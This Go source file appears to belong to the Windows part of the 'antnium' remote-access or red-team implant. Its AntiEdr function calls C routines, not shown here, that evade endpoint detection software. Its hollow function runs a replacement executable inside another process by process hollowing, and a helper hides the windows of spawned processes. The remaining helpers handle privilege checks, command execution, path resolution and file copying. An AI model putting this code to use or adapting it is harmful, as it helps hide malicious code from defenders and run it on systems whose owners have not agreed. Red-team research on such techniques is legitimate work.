// +build windows

package arch

/*
extern int InitSyscallsFromLdrpThunkSignature();
extern int Technique1();
*/
import "C"

import (
	"io"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"io/ioutil"

	fp "path/filepath"

	"github.com/dobin/antnium/pkg/inject"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"golang.org/x/text/encoding/charmap"
)

var (
	processTimeout time.Duration = 30 * time.Second
	antiEdrActive  bool          = false
)

func AntiEdr() error {
	if antiEdrActive {
		return nil
	}

	log.Info("Activate Anti EDR")
	ret := C.InitSyscallsFromLdrpThunkSignature()
	if ret == 0 {
		log.Error("AntiEDR: InitSyscallsFromLdrpThunkSignature error")
	}

	ret = C.Technique1()
	if ret == 0 {
		log.Error("AntiEDR: Technique1 error")
	}

	antiEdrActive = true

	return nil
}

// https://coolaj86.com/articles/golang-and-windows-and-admins-oh-my/
func Permissions() (bool, bool, error) {
	var sid *windows.SID

	// Although this looks scary, it is directly copied from the
	// official windows documentation. The Go API for this is a
	// direct wrap around the official C++ API.
	// See https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false, false, err
	}

	// This appears to cast a null pointer so I'm not sure why this
	// works, but this guy says it does and it Works for Me™:
	// https://github.com/golang/go/issues/28804#issuecomment-438838144
	token := windows.Token(0)

	member, err := token.IsMember(sid)
	if err != nil {
		return false, false, err
	}

	// Also note that an admin is _not_ necessarily considered
	// elevated.
	// For elevation see https://github.com/mozey/run-as-admin

	isElevated := token.IsElevated()
	isAdmin := member
	return isElevated, isAdmin, nil
}

func ExecOutputDecode(data []byte) string {
	d := charmap.CodePage850.NewDecoder()
	outDecoded, err := d.Bytes(data)
	if err != nil {
		// Fall back to stdout if decoding failed
		return string(data)
	} else {
		return string(outDecoded)
	}
}

func hollow(source, replace, name string, args []string) (int, []byte, []byte, int, error) {
	//log.Infof("Replacing %s with %s", source, replace)
	data, _ := ioutil.ReadFile(replace)
	return inject.RunPE64(data, source, name, strings.Join(args, " "))
}

func execIt(cmd *exec.Cmd) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
	stdOut = make([]byte, 0)
	stdErr = make([]byte, 0)
	pid = 0
	exitCode = 0

	stdOut, err = cmd.Output()
	if err != nil {
		if exitError, ok := err.(*exec.ExitError); ok {
			stdErr = exitError.Stderr
			pid = exitError.Pid()
			exitCode = exitError.ProcessState.ExitCode()
		} else {
			pid = 0
			exitCode = cmd.ProcessState.ExitCode()
		}
		return stdOut, stdErr, pid, exitCode, err
	} else {
		pid = cmd.ProcessState.Pid()
		exitCode = cmd.ProcessState.ExitCode()
	}

	return stdOut, stdErr, pid, exitCode, nil
}

func getSysProcAttrs() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow: true,
	}
}

// from https://gitlab.com/stu0292/windowspathenv/-/blob/master/windowsPathEnv.go (No license)
// Resolve first element of a filepath as environment variable if enclosed in %. Only the first path element is considered as an environment variable. Eg:
// %GOPATH%/bin/gitlab.com/stu-b-doo/
func ResolveWinVar(filepath string) (out string) {
	// return the original filepath unchanged unless we get to the end
	out = filepath

	// return unless strings starts with %
	if !strings.HasPrefix(filepath, "%") {
		return
	}

	// return unless there's a second %
	trim := strings.TrimPrefix(filepath, "%")
	i := strings.Index(trim, "%")
	if i == -1 {
		return
	}

	varName := trim[:i]

	// check if substr between two % is the name of an existing env var
	val, ok := os.LookupEnv(varName)
	if !ok {
		return
	}

	// env var value will use os path separator
	remainder := fp.FromSlash(trim[i+1:])

	// check the remainder starts with path separateor
	if !strings.HasPrefix(remainder, "\\") {
		return
	}

	// prepend the value to the remainder of the path
	return val + remainder
}

func CopyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func IsValidPath(fp string) bool {
	// Check if file already exists
	if _, err := os.Stat(fp); err == nil {
		return true
	}

	// Attempt to create it
	var d []byte
	if err := ioutil.WriteFile(fp, d, 0644); err == nil {
		os.Remove(fp) // And delete it
		return true
	}

	return false
}
